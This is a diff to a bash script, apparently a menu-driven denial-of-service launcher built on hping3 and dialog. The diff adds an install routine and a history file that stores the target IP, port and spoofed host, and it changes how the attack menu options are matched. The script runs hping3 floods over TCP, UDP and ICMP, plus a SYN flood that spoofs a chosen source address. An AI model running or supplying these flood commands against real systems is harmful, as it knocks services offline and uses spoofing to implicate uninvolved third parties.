@@ -1,4 +1,42 @@
 #!/bin/bash
+if [ "$1" = "Install" ] || [ "$1" = "install" ]; then
+    if [ ! -d ~/.dos_history/ ]; then
+        mkdir ~/.dos_history/
+        echo "Couldn't find ${HOME}/.dos_history, attempting to create it."
+    else
+        echo "Found ${HOME}/.dos_history"
+    fi
+    DIALOG_VER=`dialog -v | sed -n 1p | awk '{printf $5}' | cut -f1 -d'-'`
+    if [ "${DIALOG_VER}" != "" ]; then
+        echo "Found dialog"
+    else
+        echo "dialog does not appear to be installed."
+    fi
+    if [ ! -e ~/.dos_history/.last_dos ]; then
+    # No indents to stop indenting on the file.
+        echo "Last_IP: ADDRESS_HERE
+Last_Protocol: TCP
+Last_Port: PORT_HERE
+Last_Payload_Size: 64
+Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
+        echo "Couldn't find ${HOME}/.dos_history/.last_dos, made example automatically."
+    else
+        echo "Found ${HOME}/.dos_history/.last_dos"
+    fi
+    HPING3_TEST=`hping3 -v | sed -n 1p | awk '{printf $1}'`
+    if [ "${HPING3_TEST}" != "" ]; then
+        echo "Found hping3"
+    else
+        echo "hping3 does not appear to be installed."
+        echo "hping3 is required, prior versions will not suffice since they don't appear to have --flood."
+    fi
+    echo "Would you like to continue?"
+    printf "[Y/N] [Y]: "
+    read ANSWER
+    if [ "${ANSWER}" = "N" ] || [ "${ANSWER}" = "n" ]; then
+        exit 0
+    fi
+fi
 DOS_HISTORY_FILE=~/.dos_history/.last_dos
 LAST_IP=`grep -w 'Last_IP:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
 LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
@@ -68,6 +106,8 @@ if [ "$1" = "History" ] || [ "$1" = "history" ]; then
     cd ${LAST_DIR}
 fi
 #7:58PM 13/01/2012
+echo "TCP is ${TCP} UDP is ${UDP} SYN is ${SYN} ICMP is ${ICMP}"
+sleep 3
 opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 11 30 4 \
 TCP TCP ${TCP} \
 UDP UDP ${UDP} \
@@ -100,22 +140,22 @@ function countdown {
     dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Attack..." 3 25
 }
 
-if [ "${opt}" = "1" ]; then
+if [ "${opt}" = "TCP" ]; then
     main
     countdown
     hping3 --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
-elif [ "${opt}" = "2" ]; then
+elif [ "${opt}" = "UDP" ]; then
     main
     countdown
     hping3 --udp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
-elif [ "${opt}" = "3" ]; then
+elif [ "${opt}" = "SYN" ]; then
     main
     SPOOF_HOST=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What host/IP should be spoofed?" 8 40 --stdout`
     echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/${IP}
     echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/.last_dos
     countdown
     hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
-elif [ "${opt}" = "4" ]; then
+elif [ "${opt}" = "ICMP" ]; then
     main
     countdown
     hping3 --icmp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
